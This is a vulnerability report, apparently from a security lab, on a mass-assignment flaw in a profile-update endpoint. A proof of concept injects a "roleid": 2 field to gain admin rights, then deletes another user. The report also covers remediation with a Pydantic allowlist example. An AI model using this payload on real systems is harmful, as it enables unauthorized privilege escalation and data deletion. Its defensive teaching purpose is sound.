# Vulnerability Report: Vertical Privilege Escalation via Mass Assignment / Over-Posting in User Profile Update

* **Vulnerability Type:** Mass Assignment / Over-Posting (CWE-915) / Vertical Privilege Escalation (CWE-269)
* **Severity:** High
* **Target Component:** Profile Update Endpoint (`/my-account/change-email`)
* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

---

## 1. Executive Summary
A critical vertical privilege escalation vulnerability caused by Mass Assignment (Over-Posting) was identified in the application's profile management API. When users update their email addresses, the backend endpoint binds incoming JSON parameters directly to backend domain models without enforcing a field-level allowlist. An authenticated non-privileged user can inject internal parameters such as `"roleid": 2` into the JSON body of the update request, granting themselves administrative privileges and full access to the administrative dashboard at `/admin`.

---

## 2. Technical Analysis & Root Cause
The vulnerability exists due to automatic object parameter binding within the backend controller handling user profile updates.

### Mass Assignment Mechanism
1. **Automatic Binding:** When a client sends a request to `/my-account/change-email`, the web framework automatically maps JSON keys directly to attributes on the user account database object.
2. **Missing Property Allowlist:** The application lacks Data Transfer Object (DTO) validation or property binding restrictions. As a result, parameters intended strictly for internal state management (e.g., `roleid`) can be overwritten by arbitrary client input.
3. **Insecure Authorization Checks:** The administrative portal at `/admin` verifies user authority by checking if `roleid == 2`. Because `roleid` was updated in the database via the profile update request, the user successfully bypasses access control checks.

```
[ Authenticated User ] 
            |
            | POST /my-account/change-email
            | Payload: {"email": "user@test.net", "roleid": 2}
            v
[ Web Server / Framework ]
            |
            | (Automatic Binding without DTO Filtering)
            v
[ Database: User Table ] ---> Update wiener SET email='...', roleid=2;
            |
            | Access /admin (Checks roleid == 2 -> Granted)
            v
[ Administrative Dashboard Granted ]
```

---

## 3. Proof of Concept (PoC)

1. Log in to the application using standard user credentials (`wiener:peter`).
2. Navigate to **My Account** and enter a new email address in the email modification form.
3. Intercept the HTTP request using Burp Suite:
   ```http
   POST /my-account/change-email HTTP/1.1
   Host: target-app.net
   Content-Type: application/json
   Cookie: session=vX9z...

   {
     "email": "wiener@normal-user.net"
   }
   ```
4. Send the request to **Burp Repeater**. Modify the JSON request body to inject the privileged role parameter:
   ```http
   POST /my-account/change-email HTTP/1.1
   Host: target-app.net
   Content-Type: application/json
   Cookie: session=vX9z...

   {
     "email": "wiener@normal-user.net",
     "roleid": 2
   }
   ```
5. **Observe Response:** The server processes the request and returns `HTTP 200 OK`.
6. Refresh the web session in the browser. Confirm that the administrative header/link is now visible. Navigate to the `/admin` endpoint to verify full access to administrative user controls.
7. Execute the user deletion endpoint for `carlos`:
   ```http
   GET /admin/delete?username=carlos HTTP/1.1
   Host: target-app.net
   Cookie: session=vX9z...
   ```
8. **Result:** User `carlos` is deleted successfully, returning `HTTP 200 OK`.

---

## 4. Impact
* **Vertical Privilege Escalation:** Any authenticated user can grant themselves administrative privileges (`roleid: 2`).
* **Unauthorized Data Deletion & Tampering:** Administrative permissions grant complete control over backend user records and administrative features.
* **API Mass Assignment Risk:** Incomplete input sanitization exposes internal object structures to remote manipulation.

---

## 5. Remediation & Developer Guidance

### Primary Fixes
1. **Use Data Transfer Objects (DTOs) and Allowlisting:**
   Explicitly define which properties can be bound from client requests. Never bind incoming JSON objects directly to internal database domain models.
2. **Ignore Sensitive Attributes in Request Schemas:**
   Ensure sensitive attributes such as `role`, `roleid`, `is_admin`, or `permissions` are read-only and updated solely through dedicated, highly restricted administrative endpoints.
3. **Enforce Role Modification Checks:**
   Implement strict authorization logic verifying that only existing administrators can alter role attributes.

#### Secure Code Implementation Example (Python / Flask + Pydantic)
```python
from flask import Flask, request, session, jsonify, abort
from pydantic import BaseModel, EmailStr

app = Flask(__name__)

# Define strict DTO allowing ONLY email modifications
class EmailUpdateDTO(BaseModel):
    email: EmailStr

@app.route('/my-account/change-email', methods=['POST'])
def update_email():
    user_id = session.get('user_id')
    if not user_id:
        abort(401)
        
    try:
        # Validate request payload against strict DTO schema
        # Any unexpected parameters (like roleid) are safely ignored or rejected
        data = EmailUpdateDTO(**request.json)
    except Exception as e:
        return jsonify({"error": "Invalid input parameters"}), 400
        
    # Update user record safely using ONLY the validated email field
    db_update_user_email(user_id=user_id, new_email=data.email)
    return jsonify({"message": "Email updated successfully"}), 200
```

---

## 6. References
* **CWE-915:** [Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
* **CWE-269:** [Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
* **OWASP API Security:** [API6:2023 Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)